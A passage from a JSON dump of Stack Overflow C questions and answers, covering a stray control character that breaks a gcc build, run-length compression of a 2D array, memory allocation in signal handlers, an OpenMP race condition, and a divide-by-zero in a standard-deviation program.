"https://www.gravatar.com/avatar/1f8685f5397a1ef5bbc531711db65ffd?s=128&d=identicon&r=PG", "display_name": "Saurabh Saini", "link": "https://stackoverflow.com/users/2432020/saurabh-saini"}, "edited": false, "score": 0, "creation_date": 1518680111, "post_id": 48780403, "comment_id": 84606577, "body": "Okay i will keep in mind from next time.Thanks"}], "answers": [{"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518587979, "post_id": 48780441, "comment_id": 84562569, "body": "Also known as control-P."}], "tags": [], "owner": {"reputation": 3624, "user_id": 8013471, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jh4jO.jpg?s=128&g=1", "display_name": "cse", "link": "https://stackoverflow.com/users/8013471/cse"}, "is_accepted": true, "score": 4, "last_activity_date": 1518588026, "last_edit_date": 1518588026, "creation_date": 1518587328, "answer_id": 48780441, "question_id": 48780403, "link": "https://stackoverflow.com/questions/48780403/expected-function-body-after-function-declarator-compiled-using-gcc-in-termin/48780441#48780441", "title": "&quot;Expected function body after function declarator &quot; compiled using GCC in Terminal", "body": "<p><code>&lt;U+0010&gt;</code> is here indicating that: <em>Unicode character with value 0x10(hexadecimal; 16 in decimal)</em>.</p>\n\n<p><code>&lt;U+0010&gt;</code> is called <code>DATA LINK ESCAPE(DLE)</code></p>\n\n<p>The error is due to this character. Since <code>&lt;U+0010&gt;</code> is a <em>control character</em> hence it is not being ignored by <code>gcc</code> compiler(<em>whitespace</em> charecters are ignored by <code>gcc</code> compiler) so, it is creating compilation error. Remove this character from your source file and it will solve the problem.</p>\n\n<p><strong>Note:</strong> <code>&lt;U+0010&gt;</code> is non printable character so you can't see it. You need to use some <code>hex-editor</code> editor. You can use <code>vim</code> editor. See <a href=\"https://vi.stackexchange.com/questions/2232/how-can-i-use-vim-as-a-hex-editor\">here</a> and <a href=\"https://vi.stackexchange.com/questions/343/how-to-edit-binary-files-with-vim\">here</a> about how to use it.</p>\n"}], "owner": {"reputation": 55, "user_id": 2432020, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/1f8685f5397a1ef5bbc531711db65ffd?s=128&d=identicon&r=PG", "display_name": "Saurabh Saini", "link": "https://stackoverflow.com/users/2432020/saurabh-saini"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 521, "favorite_count": 0, "accepted_answer_id": 48780441, "answer_count": 1, "score": 0, "last_activity_date": 1518588852, "creation_date": 1518587052, "last_edit_date": 1518588852, "question_id": 48780403, "link": "https://stackoverflow.com/questions/48780403/expected-function-body-after-function-declarator-compiled-using-gcc-in-termin", "title": "&quot;Expected function body after function declarator &quot; compiled using GCC in Terminal", "body": "<p>I am trying to compile following program using GCC in terminal</p>\n\n<pre><code>//\n//  fileCopy.c\n//  \n//\n//  Created by Saurabh Saini on 14/02/18.\n//\n#include &lt;stdio.h&gt;\n\nint main()\u0010{\n\nint c;\nc = getchar();\n\nif(c!=EOF){\n    putchar(c);\n    c = getchar();\n}\nreturn 0;\n}\n</code></pre>\n\n<p>getting the following error <a href=\"https://i.stack.imgur.com/i9LcH.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/i9LcH.png\" alt=\"enter image description here\"></a></p>\n\n<p>I need to understand what is  </p>\n\n<pre><code>&lt;U+0010&gt; \n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 13998, "user_id": 2352344, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/JHVDS.png?s=128&g=1", "display_name": "clemens", "link": "https://stackoverflow.com/users/2352344/clemens"}, "edited": false, "score": 3, "creation_date": 1518586708, "post_id": 48780281, "comment_id": 84562180, "body": "Shouldn&#39;t <code>tempInt</code> be set at the beginning of each new line?"}, {"owner": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "edited": false, "score": 1, "creation_date": 1518586725, "post_id": 48780281, "comment_id": 84562183, "body": "Nice question. You pose a clear and specific problem, along with expected inputs and outputs and an attempted solution. Nice break from the crap I normally see here."}, {"owner": {"user_type": "does_not_exist", "display_name": "user707650"}, "edited": false, "score": 1, "creation_date": 1518586814, "post_id": 48780281, "comment_id": 84562207, "body": "Your program is small enough to step through it with a debugger, or litter it with print statements, to see what precisely is going on. You can even work out all the individual steps by hand, with pen and paper, to find your mistake."}, {"owner": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "reply_to_user": {"reputation": 13998, "user_id": 2352344, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/JHVDS.png?s=128&g=1", "display_name": "clemens", "link": "https://stackoverflow.com/users/2352344/clemens"}, "edited": false, "score": 2, "creation_date": 1518586837, "post_id": 48780281, "comment_id": 84562215, "body": "@clemens. Good catch. <code>data[i][j] == tempInt</code> toggles for the row causing the problem."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1518589059, "post_id": 48780281, "comment_id": 84562963, "body": "You might like to read this: <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">How to debug small programs</a>"}, {"owner": {"reputation": 5219, "user_id": 1166774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2186f597c73ae03edf7912fa5ec93cc7?s=128&d=identicon&r=PG&f=1", "display_name": "LoztInSpace", "link": "https://stackoverflow.com/users/1166774/loztinspace"}, "edited": false, "score": 3, "creation_date": 1518589600, "post_id": 48780281, "comment_id": 84563181, "body": "Other than the specific problems you are facing, is this the required algorithm?  Seems like you could compress it better than this by just encoding the number of sequential 0 and 1s a) regardless of rows (just continue top to bottom, left to right) and not introducing the 0 or 1 before the count - with only 2 you can infer that each count changes the value it represents,"}, {"owner": {"reputation": 111, "user_id": 8654165, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/22613ef038d2602c7f614f37de7a6bd3?s=128&d=identicon&r=PG&f=1", "display_name": "Joey Ngo", "link": "https://stackoverflow.com/users/8654165/joey-ngo"}, "reply_to_user": {"reputation": 5219, "user_id": 1166774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2186f597c73ae03edf7912fa5ec93cc7?s=128&d=identicon&r=PG&f=1", "display_name": "LoztInSpace", "link": "https://stackoverflow.com/users/1166774/loztinspace"}, "edited": false, "score": 0, "creation_date": 1518598678, "post_id": 48780281, "comment_id": 84567474, "body": "@LoztInSpace Yes, actually. The output may be longer than the input in some cases, but this is the algorithm that i am tasked with. Thank you!"}], "answers": [{"comments": [{"owner": {"reputation": 111, "user_id": 8654165, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/22613ef038d2602c7f614f37de7a6bd3?s=128&d=identicon&r=PG&f=1", "display_name": "Joey Ngo", "link": "https://stackoverflow.com/users/8654165/joey-ngo"}, "edited": false, "score": 0, "creation_date": 1518598806, "post_id": 48780589, "comment_id": 84567559, "body": "can&#39;t believe i missed this out for hours"}], "tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": true, "score": 1, "last_activity_date": 1518588047, "creation_date": 1518588047, "answer_id": 48780589, "question_id": 48780281, "link": "https://stackoverflow.com/questions/48780281/compressing-a-2d-array/48780589#48780589", "title": "Compressing a 2D array", "body": "<p>As mentioned in the comments, you need to reset <code>tempInt</code> each time you start a new row</p>\n\n<pre><code>void compress2D(int data[SIZE][SIZE], int rowSize, int colSize)\n{\n    int i, j, counter = 0, tempInt = data[0][0];\n    for (i = 0; i &lt; rowSize; i++)\n    {\n        tempInt = data[i][0];                        // &lt;--------\n\n        for (j = 0; j &lt; colSize; j++)\n        {\n            if (data[i][j] == tempInt)\n                counter++;\n            else\n            {\n                printf(\"%d %d \", tempInt, counter);\n                tempInt = data[i][j];\n                counter = 1;\n\n            }\n        }\n        if (counter != 0)\n            printf(\"%d %d\", tempInt, counter);\n        counter = 0;\n        printf(\"\\n\");\n    }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518590975, "post_id": 48780838, "comment_id": 84563788, "body": "This won&#39;t work because the output always has the 1&#39;s first. And it won&#39;t work for a row like <code>0110</code>."}, {"owner": {"reputation": 3624, "user_id": 8013471, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jh4jO.jpg?s=128&g=1", "display_name": "cse", "link": "https://stackoverflow.com/users/8013471/cse"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 2, "creation_date": 1518593092, "post_id": 48780838, "comment_id": 84564715, "body": "@user3386109 I didn&#39;t gave a thought on the printing sequence. Updated!!!"}, {"owner": {"reputation": 3624, "user_id": 8013471, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jh4jO.jpg?s=128&g=1", "display_name": "cse", "link": "https://stackoverflow.com/users/8013471/cse"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518593601, "post_id": 48780838, "comment_id": 84564967, "body": "@user3386109 There is no such pattern in OP question. So I&#39;m not sure if this is what is desired. I think OP should edit/comment on this."}, {"owner": {"reputation": 3624, "user_id": 8013471, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jh4jO.jpg?s=128&g=1", "display_name": "cse", "link": "https://stackoverflow.com/users/8013471/cse"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1518593672, "post_id": 48780838, "comment_id": 84565003, "body": "@JoeyNgo What is expected output for pattern <code>0 1 1 0</code>?"}, {"owner": {"reputation": 111, "user_id": 8654165, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/22613ef038d2602c7f614f37de7a6bd3?s=128&d=identicon&r=PG&f=1", "display_name": "Joey Ngo", "link": "https://stackoverflow.com/users/8654165/joey-ngo"}, "edited": false, "score": 0, "creation_date": 1518598602, "post_id": 48780838, "comment_id": 84567416, "body": "0 1 1 2 0 1 , there are some cases where the output will be longer than the input itself"}], "tags": [], "owner": {"reputation": 3624, "user_id": 8013471, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jh4jO.jpg?s=128&g=1", "display_name": "cse", "link": "https://stackoverflow.com/users/8013471/cse"}, "is_accepted": false, "score": 2, "last_activity_date": 1518602627, "last_edit_date": 1518602627, "creation_date": 1518589171, "answer_id": 48780838, "question_id": 48780281, "link": "https://stackoverflow.com/questions/48780281/compressing-a-2d-array/48780838#48780838", "title": "Compressing a 2D array", "body": "<p>You can use following code. See it working <a href=\"https://ideone.com/MJqKZT\" rel=\"nofollow noreferrer\">here</a>:  </p>\n\n<pre><code>void compress2D(int data[SIZE][SIZE], int rowSize, int colSize)\n{\n    int i , j , counter, tempInt;\n    for (i = 0 ; i &lt; rowSize ; i++)\n    {\n        tempInt = data[i][0];\n        counter = 1;\n\n        for (j = 1 ; j &lt; colSize ; j++ )\n        {\n            if (data[i][j] == tempInt) \n                counter++ ; \n            else\n            {\n                printf(\"%d %d \" , tempInt,counter);\n                tempInt = data[i][j];\n                counter = 1;\n            }   \n        }\n        if(counter)\n            printf(\"%d %d\",tempInt, counter);\n        printf(\"\\n\");\n    }\n}\n</code></pre>\n\n<p><strong>Note:</strong> Updated after last comment of OP(<em><code>0 1 1 2 0 1</code> , there are some cases where the output will be longer than the input itself</em>).</p>\n"}], "owner": {"reputation": 111, "user_id": 8654165, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/22613ef038d2602c7f614f37de7a6bd3?s=128&d=identicon&r=PG&f=1", "display_name": "Joey Ngo", "link": "https://stackoverflow.com/users/8654165/joey-ngo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1663, "favorite_count": 0, "accepted_answer_id": 48780589, "answer_count": 2, "score": 2, "last_activity_date": 1518602627, "creation_date": 1518586360, "question_id": 48780281, "link": "https://stackoverflow.com/questions/48780281/compressing-a-2d-array", "title": "Compressing a 2D array", "body": "<p>I would like to compress a 2d array from the following input </p>\n\n<pre><code>Enter the array size (rowSize, colSize):\n4 4\nEnter the matrix (4x4):\n1 1 1 0\n0 0 1 1\n1 1 1 1\n0 0 0 0\n</code></pre>\n\n<p>to this, where the number of 1's and 0's are specified. </p>\n\n<pre><code>compress2D():\n1 3 0 1\n0 2 1 2\n1 4\n0 4 \n</code></pre>\n\n<p>the following is my code</p>\n\n<pre><code>void compress2D(int data[SIZE][SIZE], int rowSize, int colSize)\n{\nint i , j , counter = 0, tempInt = data[0][0];\nfor (i = 0 ; i &lt; rowSize ; i++)\n{\n    for (j = 0 ; j &lt; colSize ; j++ )\n    {\n        if (data[i][j] == tempInt) \n            counter++ ; \n        else\n        {\n            printf(\"%d %d \" , tempInt,counter);\n            tempInt = data[i][j];\n            counter = 1;\n\n        }   \n    }\n    if(counter!=0)\n        printf(\"%d %d\",tempInt, counter);\n    counter = 0 ;\n    printf(\"\\n\");\n}\n}\n</code></pre>\n\n<p>however this is my output </p>\n\n<pre><code>compress2D(): \n1 3 0 1\n0 2 1 2\n1 4\n1 0 0 4\n</code></pre>\n\n<p>all inputs will be binary</p>\n\n<p>any help would be greatly appreciated! </p>\n"}, {"tags": ["c", "unix", "memory", "malloc", "signals"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1518590938, "post_id": 48779875, "comment_id": 84563766, "body": "Create a list with the information for the as yet unterminated processes.  Then, in the signal handler (with the signal blocked \u2014 use <code>sigaction()</code> and not just <code>signal()</code>) you can move the relevant entry from the unterminated process list to the terminated process list.  No memory allocation needed in the signal handler."}], "answers": [{"tags": [], "owner": {"reputation": 356, "user_id": 4485708, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hwfmt.png?s=128&g=1", "display_name": "Whilom Chime", "link": "https://stackoverflow.com/users/4485708/whilom-chime"}, "is_accepted": false, "score": 1, "last_activity_date": 1518584210, "creation_date": 1518584210, "answer_id": 48779932, "question_id": 48779875, "link": "https://stackoverflow.com/questions/48779875/what-is-the-best-way-to-allocate-memory-when-signals-are-handle/48779932#48779932", "title": "What is the best way to allocate memory when signals are handle?", "body": "<p>You can't allocate memory in a signal handler; you have to have allocated the memory before you register the signal handler.  Before you register your signal handler you might allocate an array of structs to record information in while in the handler, but you have to make sure you allocate enough!</p>\n"}, {"tags": [], "owner": {"reputation": 194515, "user_id": 379897, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/73c5967cf90e62b10d34b1d2d0ad3aae?s=128&d=identicon&r=PG", "display_name": "R.. GitHub STOP HELPING ICE", "link": "https://stackoverflow.com/users/379897/r-github-stop-helping-ice"}, "is_accepted": false, "score": 2, "last_activity_date": 1518585412, "creation_date": 1518585412, "answer_id": 48780122, "question_id": 48779875, "link": "https://stackoverflow.com/questions/48779875/what-is-the-best-way-to-allocate-memory-when-signals-are-handle/48780122#48780122", "title": "What is the best way to allocate memory when signals are handle?", "body": "<p>While not directly an answer to your question as written, the right answe is basically: don't. Don't do anything in the signal handler. Don't even install a signal handler if you don't have to.</p>\n\n<p>For your example with child processes, your <code>SIGCHLD</code> handler should do nothing more than wake up another part of the program (e.g. with the self-pipe trick) to wait on the child process that exited and record its status. Even better, just make a thread for each child process you're waiting on to perform a synchronous <code>waitpid</code>; then no global state or signal handler is needed.</p>\n"}], "owner": {"reputation": 177, "user_id": 4868575, "user_type": "registered", "profile_image": "https://graph.facebook.com/953653438001832/picture?type=large", "display_name": "Gustavo Alejandro Castellanos ", "link": "https://stackoverflow.com/users/4868575/gustavo-alejandro-castellanos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 436, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1518585412, "creation_date": 1518583835, "question_id": 48779875, "link": "https://stackoverflow.com/questions/48779875/what-is-the-best-way-to-allocate-memory-when-signals-are-handle", "title": "What is the best way to allocate memory when signals are handle?", "body": "<p>I know <code>malloc</code> is not a safe function, so I will be happy if you give me a correct and standard way to allocate memory when signals are handle.\nFor example, let's say I would like to store in a linked list the time each child process terminates. How can I create new nodes for the linked list without using malloc inside a signal handler?\nI am very new with this topic.</p>\n"}, {"tags": ["c", "multithreading", "openmp", "race-condition"], "comments": [{"owner": {"reputation": 1026, "user_id": 3528626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b596e5c6f26768d504a99b72fd46f77b?s=128&d=identicon&r=PG&f=1", "display_name": "hisener", "link": "https://stackoverflow.com/users/3528626/hisener"}, "edited": false, "score": 1, "creation_date": 1518589370, "post_id": 48779782, "comment_id": 84563083, "body": "Why do you call <code>omp_unset_lock</code> end of the second loop?"}, {"owner": {"reputation": 530, "user_id": 2394541, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f9b9b9399b329591f7be92da1c5e442?s=128&d=identicon&r=PG", "display_name": "tim18", "link": "https://stackoverflow.com/users/2394541/tim18"}, "edited": false, "score": 0, "creation_date": 1518612529, "post_id": 48779782, "comment_id": 84576805, "body": "I don&#39;t understand the reason you give for not doing this straightforward.  Nesting the outer loop backwards, as well as your usage of threadTasks, creates false sharing and probably makes parallelization useless.  Your compiler may not scalarize c[i][j] even with loop nesting fixed, even if it would do so without openmp.  This would be particularly important if you haven&#39;t set restrict."}, {"owner": {"reputation": 19, "user_id": 9358191, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d882029b98a39276a6562a2f0a2e8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Programmer1010", "link": "https://stackoverflow.com/users/9358191/programmer1010"}, "reply_to_user": {"reputation": 1026, "user_id": 3528626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b596e5c6f26768d504a99b72fd46f77b?s=128&d=identicon&r=PG&f=1", "display_name": "hisener", "link": "https://stackoverflow.com/users/3528626/hisener"}, "edited": false, "score": 0, "creation_date": 1518657142, "post_id": 48779782, "comment_id": 84600094, "body": "@hisener That was an error I fixed it. Thanks for pointing it out"}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 9358191, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d882029b98a39276a6562a2f0a2e8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Programmer1010", "link": "https://stackoverflow.com/users/9358191/programmer1010"}, "edited": false, "score": 0, "creation_date": 1518657203, "post_id": 48782074, "comment_id": 84600110, "body": "Yeah it only works if you make the inner loop private. Thank you for the heads up. I was just working on pthreads so openmp was somewhat hard to understand for me but I think I got it. Thank you"}], "tags": [], "owner": {"reputation": 20828, "user_id": 620382, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bf285996e4e7188feac84786a47d9f3a?s=128&d=identicon&r=PG", "display_name": "Zulan", "link": "https://stackoverflow.com/users/620382/zulan"}, "is_accepted": true, "score": 1, "last_activity_date": 1518594417, "creation_date": 1518594417, "answer_id": 48782074, "question_id": 48779782, "link": "https://stackoverflow.com/questions/48779782/openmp-nested-for-loop-race-condition/48782074#48782074", "title": "OpenMP Nested For Loop Race Condition", "body": "<p>You don't need any protection (locks, atomics, critical sections) against race conditions for this matrix multiplication. In fact it would totally kill your performance doing so. Since each thread is executing a different <code>i</code>, different threads can never write or read the same index of <code>c[i][j]</code>.</p>\n\n<p>However, you need to have private loop variables for your inner loops or everything goes wrong. In general, declare all variables as locally as possible. Then they are implicit private which is almost always the right thing for a variable that is not needed outside of a private section.</p>\n\n<blockquote>\n  <p>I know how to do it using private, but I want to actually synchronize the threads, not create multiple variables for the threads and then combine at the end.</p>\n</blockquote>\n\n<p>For the inner loop variables, there is no alternative to making them private. Many times, a reduction (private copies, aggregation at the end), can perform better than a shared result variable. In this case a shared result should be fine.</p>\n"}, {"tags": [], "owner": {"reputation": 171, "user_id": 11353265, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KYMT0.jpg?s=128&g=1", "display_name": "cho_uc", "link": "https://stackoverflow.com/users/11353265/cho-uc"}, "is_accepted": false, "score": 0, "last_activity_date": 1558908396, "creation_date": 1558908396, "answer_id": 56317715, "question_id": 48779782, "link": "https://stackoverflow.com/questions/48779782/openmp-nested-for-loop-race-condition/56317715#56317715", "title": "OpenMP Nested For Loop Race Condition", "body": "<p>For multiple nested loops with various operations, I will not use <code>#pragma omp parallel for</code>, instead I break down into <code>#pragma omp parallel</code> and <code>#pragma omp for collapse(2)</code>.\nSee the full code below:</p>\n\n<pre><code>#pragma omp parallel\n{\n#pragma omp for collapse(2)\n    for (i = 0; i &lt; N; i++){\n        for (j = 0; j &lt; N; j++){\n            c_parallel[i][j] = 0.;\n            for (k = 0; k &lt; N; k++) {  \n               c_parallel[i][j] += a_parallel[i][k] * b_parallel[k][j];    \n            }\n        }\n    }\n\n}//end parallel region\n\n</code></pre>\n\n<p>I am using <code>vector&lt; vector&lt;float&gt;&gt;</code> for the matrix and got 300% faster performance on i5 4 cores/Win10.</p>\n"}], "owner": {"reputation": 19, "user_id": 9358191, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d882029b98a39276a6562a2f0a2e8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Programmer1010", "link": "https://stackoverflow.com/users/9358191/programmer1010"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 654, "favorite_count": 0, "accepted_answer_id": 48782074, "answer_count": 2, "score": 0, "last_activity_date": 1558908396, "creation_date": 1518583298, "last_edit_date": 1518657122, "question_id": 48779782, "link": "https://stackoverflow.com/questions/48779782/openmp-nested-for-loop-race-condition", "title": "OpenMP Nested For Loop Race Condition", "body": "<p>I am having a race problem with the current situation. I am trying to create the amount of threads as there are cores, use locks on OMP. I have tried to do <code>#pragma omp critical</code> and also <code>#pragma amp atomic</code> and none of them are helping. I am getting some crazy negative numbers... I know how to do it using private, but I want to actually synchronize the threads, not create multiple variables for the threads and then combine at the end.</p>\n\n<pre><code>// multiplication\n#pragma omp parallel for\nfor (i = 0; i &lt; N; i++)\n{\n     for (j = 0; j &lt; N; j++)\n     {\n          c[i][j] = 0.;\n          for (k = 0; k &lt; N; k++) \n          {        \n               omp_set_lock(&amp;lock);\n               //#pragma omp critical\n               //#pragma omp atomic\n               c[i][j] += a[i][k] * b[k][j];\n               threadTasks[omp_get_thread_num()]++;\n               omp_unset_lock(&amp;lock);\n          }\n          printf(\"[%d, %d]: Thread ID %d\\n\", i, j, omp_get_thread_num());\n     }\n}\n</code></pre>\n"}, {"tags": ["c", "loops", "floating-point", "do-while", "standard-deviation"], "comments": [{"owner": {"reputation": 29, "user_id": 5434703, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8b2cd178690d211c3e6b2c3f4126fd66?s=128&d=identicon&r=PG&f=1", "display_name": "asdf", "link": "https://stackoverflow.com/users/5434703/asdf"}, "edited": false, "score": 0, "creation_date": 1518582401, "post_id": 48779647, "comment_id": 84560928, "body": "input 1, 2, 3, 4  returns    -2.500000\t6.250000\tinf\tinf 4\t0\t0\t2.500000\tinf"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518582456, "post_id": 48779647, "comment_id": 84560947, "body": "Your loop is flawed. If the user inputs an empty line (the loop ending condition) then <code>grade</code> will be equal to zero and you will use that value as well instead of breaking out of the loop."}, {"owner": {"reputation": 198293, "user_id": 707111, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/oXZkh.jpg?s=128&g=1", "display_name": "Ry-", "link": "https://stackoverflow.com/users/707111/ry"}, "edited": false, "score": 3, "creation_date": 1518582470, "post_id": 48779647, "comment_id": 84560951, "body": "<code>average = (float)(sum &#47; counter)</code> happens when <code>counter == 0</code>"}, {"owner": {"reputation": 29, "user_id": 5434703, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8b2cd178690d211c3e6b2c3f4126fd66?s=128&d=identicon&r=PG&f=1", "display_name": "asdf", "link": "https://stackoverflow.com/users/5434703/asdf"}, "edited": false, "score": 0, "creation_date": 1518582649, "post_id": 48779647, "comment_id": 84561008, "body": "average is returning the correct value--"}, {"owner": {"reputation": 29, "user_id": 5434703, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8b2cd178690d211c3e6b2c3f4126fd66?s=128&d=identicon&r=PG&f=1", "display_name": "asdf", "link": "https://stackoverflow.com/users/5434703/asdf"}, "edited": false, "score": 0, "creation_date": 1518582871, "post_id": 48779647, "comment_id": 84561078, "body": "I have to use a do while"}, {"owner": {"reputation": 29, "user_id": 5434703, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8b2cd178690d211c3e6b2c3f4126fd66?s=128&d=identicon&r=PG&f=1", "display_name": "asdf", "link": "https://stackoverflow.com/users/5434703/asdf"}, "edited": false, "score": 0, "creation_date": 1518583207, "post_id": 48779647, "comment_id": 84561168, "body": "not really any option, but thanks for the advice I suppose."}], "answers": [{"tags": [], "owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "is_accepted": false, "score": 2, "last_activity_date": 1518589320, "creation_date": 1518589320, "answer_id": 48780880, "question_id": 48779647, "link": "https://stackoverflow.com/questions/48779647/getting-inf-when-calculating-standard-devation-in-c/48780880#48780880", "title": "getting inf when calculating standard devation in c", "body": "<p>You initialize</p>\n\n<pre><code> int counter = 0;\n</code></pre>\n\n<p>and in your first loop do</p>\n\n<pre><code> average = (float)(sum/counter);    // In the first loop count is zero, i.e. divide by zero\n counter++;\n</code></pre>\n\n<p>so you divide by zero which leads to <code>inf</code></p>\n\n<p>Just switch the lines like:</p>\n\n<pre><code> counter++;\n average = (float)(sum/counter);\n</code></pre>\n"}], "owner": {"reputation": 29, "user_id": 5434703, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/8b2cd178690d211c3e6b2c3f4126fd66?s=128&d=identicon&r=PG&f=1", "display_name": "asdf", "link": "https://stackoverflow.com/users/5434703/asdf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1518589849, "creation_date": 1518582265, "last_edit_date": 1518589849, "question_id": 48779647, "link": "https://stackoverflow.com/questions/48779647/getting-inf-when-calculating-standard-devation-in-c", "title": "getting inf when calculating standard devation in c", "body": "<p>Attempting to write a program in c that intakes in an amount of numbers. ie <code>1, 2, 3, 4</code>, and returns size, max, min, average and standard deviation. </p>\n\n<p>While trying to calculate standard deviation when calculating <code>sumx</code> ( line 51) it begins returng inf. \nnot sure why I would be getting inf with an addition function. </p>\n\n<p>I have all the print methods to try identify where it breaks. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\nint main(void) {\n\n    setvbuf(stdout, NULL, _IONBF, 0); // Turn off output buffering. Required for automated testing.     return EXIT_SUCCESS;\n\n    int temp;\n    float grade, alteredGrade,standardD, sdPartOne, sdPartTwo, sdPartThree, sum;\n    float sum;\n    float sumx = 0.0;\n    int counter = 0;\n    int max;\n    int min;\n    float average;\n    char buffer[BUFSIZ+1];\n\n    printf(\"Enter scores, one per line.  Press &lt;ENTER&gt; on a blank line to end.\\n\"); // NOTE: The \\n is required for automated testing.\n\n    do {\n        grade = atoi(fgets(buffer, BUFSIZ, stdin));\n\n        //sets max and min to grade\n        max = grade;\n        min = grade;\n\n        //lets loop 